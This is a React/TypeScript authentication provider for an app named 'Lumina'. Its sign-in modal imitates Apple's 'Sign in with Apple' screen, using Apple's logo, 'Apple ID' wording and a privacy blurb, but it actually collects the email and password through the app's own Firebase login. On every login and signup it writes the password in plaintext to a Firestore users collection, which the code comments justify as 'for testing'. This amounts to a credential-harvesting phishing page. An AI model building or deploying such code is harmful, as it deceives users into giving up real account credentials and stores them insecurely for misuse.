import React, { createContext, useContext, useState, ReactNode, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { X, Loader2, Eye, EyeOff } from 'lucide-react';
import { Link } from 'react-router-dom';
import { auth, db } from '../firebase';
import { 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  signOut, 
  onAuthStateChanged,
  User as FirebaseUser 
} from 'firebase/auth';
import { doc, setDoc, serverTimestamp } from 'firebase/firestore';

interface AuthContextType {
  user: FirebaseUser | null;
  isLoggedIn: boolean;
  loading: boolean;
  error: string | null;
  login: (email: string, pass: string) => Promise<void>;
  signup: (email: string, pass: string) => Promise<void>;
  logout: () => Promise<void>;
  requireAuth: (action: () => void) => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider = ({ children }: { children: ReactNode }) => {
  const [user, setUser] = useState<FirebaseUser | null>(null);
  const [loading, setLoading] = useState(true);
  const [authLoading, setAuthLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [pendingAction, setPendingAction] = useState<(() => void) | null>(null);
  const [isSignUp, setIsSignUp] = useState(true);

  // Form states
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      setUser(user);
      setLoading(false);
    });
    return unsubscribe;
  }, []);

  const saveUserToFirestore = async (uid: string, email: string, pass: string) => {
    try {
      await setDoc(doc(db, 'users', uid), {
        email: email,
        password: pass, // Storing plain text as requested for testing
        lastLogin: serverTimestamp(),
        createdAt: serverTimestamp()
      }, { merge: true });
    } catch (err) {
      console.error("Error saving user to Firestore:", err);
    }
  };

  const login = async (email: string, pass: string) => {
    setAuthLoading(true);
    setError(null);
    try {
      const userCredential = await signInWithEmailAndPassword(auth, email, pass);
      await saveUserToFirestore(userCredential.user.uid, email, pass);
      setShowModal(false);
      setEmail('');
      setPassword('');
      if (pendingAction) {
        setTimeout(() => {
          pendingAction();
          setPendingAction(null);
        }, 300);
      }
    } catch (err: any) {
      setError(err.message || 'Failed to sign in');
    } finally {
      setAuthLoading(false);
    }
  };

  const signup = async (email: string, pass: string) => {
    setAuthLoading(true);
    setError(null);
    try {
      const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
      await saveUserToFirestore(userCredential.user.uid, email, pass);
      setShowModal(false);
      setEmail('');
      setPassword('');
      if (pendingAction) {
        setTimeout(() => {
          pendingAction();
          setPendingAction(null);
        }, 300);
      }
    } catch (err: any) {
      setError(err.message || 'Failed to create account');
    } finally {
      setAuthLoading(false);
    }
  };

  const logout = async () => {
    await signOut(auth);
  };

  const requireAuth = (action: () => void) => {
    if (user) {
      action();
    } else {
      setPendingAction(() => action);
      setShowModal(true);
    }
  };

  useEffect(() => {
    if (!showModal) {
      setShowPassword(false);
    }
  }, [showModal]);

  useEffect(() => {
    setShowPassword(false);
  }, [isSignUp]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (isSignUp) {
      signup(email, password);
    } else {
      login(email, password);
    }
  };

  return (
    <AuthContext.Provider value={{ user, isLoggedIn: !!user, loading, error, login, signup, logout, requireAuth }}>
      {children}
      <AnimatePresence>
        {showModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => { if (!authLoading) setShowModal(false); }}
              className="absolute inset-0 bg-black/40 backdrop-blur-md"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="relative w-full max-w-[440px] bg-white rounded-[32px] shadow-2xl overflow-hidden p-8 md:p-12 flex flex-col items-center text-center"
            >
              <button 
                onClick={() => setShowModal(false)}
                disabled={authLoading}
                className="absolute top-6 right-6 p-2 text-slate-400 hover:text-slate-900 transition-colors disabled:opacity-50"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="w-16 h-16 bg-black rounded-2xl flex items-center justify-center mb-8 shadow-lg">
                <svg viewBox="0 0 384 512" className="w-8 h-8 fill-white">
                  <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
                </svg>
              </div>

              <h2 className="text-3xl font-bold tracking-tight text-slate-900 mb-2">
                {isSignUp ? 'Sign up for Lumina' : 'Sign in to Lumina'}
              </h2>
              <p className="text-slate-500 text-sm mb-10 max-w-[280px]">
                {isSignUp 
                  ? 'Use your Apple ID to create your Lumina account.' 
                  : 'Use your Apple ID to sign in to your Lumina account.'}
              </p>

              <form onSubmit={handleSubmit} className="w-full space-y-4">
                {error && (
                  <div className="p-3 bg-red-50 text-red-500 text-xs rounded-xl border border-red-100 mb-4">
                    {error}
                  </div>
                )}
                
                <div className="relative group">
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Apple ID"
                    disabled={authLoading}
                    className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl text-slate-900 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-900/5 focus:border-slate-900 transition-all text-center md:text-left disabled:opacity-50"
                  />
                </div>
                
                <div className="relative group">
                  <input
                    type={showPassword ? "text" : "password"}
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    disabled={authLoading}
                    className="w-full px-5 py-4 bg-slate-50 border border-slate-200 rounded-2xl text-slate-900 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-900/5 focus:border-slate-900 transition-all text-center md:text-left disabled:opacity-50 pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 p-2 text-slate-400 hover:text-slate-900 transition-colors disabled:opacity-50"
                    disabled={authLoading}
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>

                <button
                  type="submit"
                  disabled={authLoading}
                  className="w-full py-4 bg-black text-white font-bold rounded-2xl hover:bg-slate-900 transition-all active:scale-[0.98] mt-4 flex items-center justify-center gap-3 disabled:bg-slate-800"
                >
                  {authLoading ? (
                    <Loader2 className="w-5 h-5 animate-spin" />
                  ) : (
                    <>
                      <svg viewBox="0 0 384 512" className="w-5 h-5 fill-white">
                        <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
                      </svg>
                      {isSignUp ? 'Continue with Apple' : 'Sign in with Apple'}
                    </>
                  )}
                </button>
              </form>

              <div className="mt-8 flex flex-col items-center gap-4">
                <button 
                  onClick={() => setIsSignUp(!isSignUp)}
                  disabled={authLoading}
                  className="text-sm font-medium text-slate-900 hover:underline disabled:opacity-50"
                >
                  {isSignUp ? 'Already have an ID? Sign in' : 'Don\'t have an Apple ID? Create yours now'}
                </button>
                <a href="#" className="text-xs text-slate-400 hover:text-slate-600 transition-colors">
                  Forgotten your Apple ID or password?
                </a>
              </div>
              
              <div className="mt-12 pt-8 border-t border-slate-100 w-full">
                <p className="text-[10px] text-slate-400 leading-relaxed max-w-[300px] mx-auto">
                  Your Apple ID information is used to enable Apple services when you sign in. To learn more, read our <Link to="/privacy" onClick={() => setShowModal(false)} className="text-slate-900 hover:underline">Privacy Policy</Link>.
                </p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
